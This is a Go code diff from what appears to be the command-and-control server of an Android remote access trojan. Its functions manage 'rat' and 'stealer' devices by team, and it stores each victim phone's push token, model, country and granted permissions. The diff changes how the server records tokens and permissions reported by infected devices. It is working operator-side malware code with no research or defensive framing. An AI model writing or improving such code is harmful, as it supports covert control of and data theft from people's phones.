@@ -304,6 +304,27 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 
 	ensureDeviceExists(deviceID, teamID, width, height)
 
+	// Save FCM token and device info from the first WS message if provided
+	// (handles the case where HTTP /register was not called or token changed).
+	if fcmToken, _ := reg["fcm_token"].(string); fcmToken != "" {
+		db.DB.Exec(
+			`UPDATE devices SET fcm_token = ? WHERE device_id = ? AND COALESCE(deleted,0) = 0 AND (fcm_token = '' OR fcm_token IS NULL)`,
+			fcmToken, deviceID,
+		)
+	}
+	if model, _ := reg["model"].(string); model != "" {
+		db.DB.Exec(
+			`UPDATE devices SET model = ? WHERE device_id = ? AND COALESCE(deleted,0) = 0 AND (model = '' OR model IS NULL)`,
+			model, deviceID,
+		)
+	}
+	if country, _ := reg["country"].(string); country != "" {
+		db.DB.Exec(
+			`UPDATE devices SET country = ? WHERE device_id = ? AND COALESCE(deleted,0) = 0 AND (country = '' OR country IS NULL)`,
+			country, deviceID,
+		)
+	}
+
 	dc := &DeviceConn{
 		ID:        deviceID,
 		TeamID:    teamID,
@@ -690,8 +711,6 @@ func ensureStealerDevice(deviceID, teamID string) {
 func ensureDeviceExists(deviceID, teamID string, width, height int) {
 	db.DB.Exec("INSERT OR IGNORE INTO teams (id, name) VALUES (?, ?)", teamID, "team_"+teamID)
 
-	perms := `{"accessibility":true}`
-
 	var exists, isDeleted int
 	db.DB.QueryRow("SELECT COUNT(*), COALESCE(MAX(deleted),0) FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&exists, &isDeleted)
 	if isDeleted == 1 {
@@ -700,15 +719,16 @@ func ensureDeviceExists(deviceID, teamID string, width, height int) {
 	if exists == 0 {
 		db.DB.Exec(
 			`INSERT INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, device_type, permissions, last_seen, created_at)
-			 VALUES (?, ?, ?, '', '', '', 1, 0, 'rat', ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
-			deviceID, deviceID, teamID, perms,
+			 VALUES (?, ?, ?, '', '', '', 1, 0, 'rat', '{}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
+			deviceID, deviceID, teamID,
 		)
 		return
 	}
 
+	// Do NOT overwrite permissions — they are set by the device via HTTP registration.
 	db.DB.Exec(
-		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', permissions = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`,
-		teamID, perms, deviceID,
+		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`,
+		teamID, deviceID,
 	)
 }
 
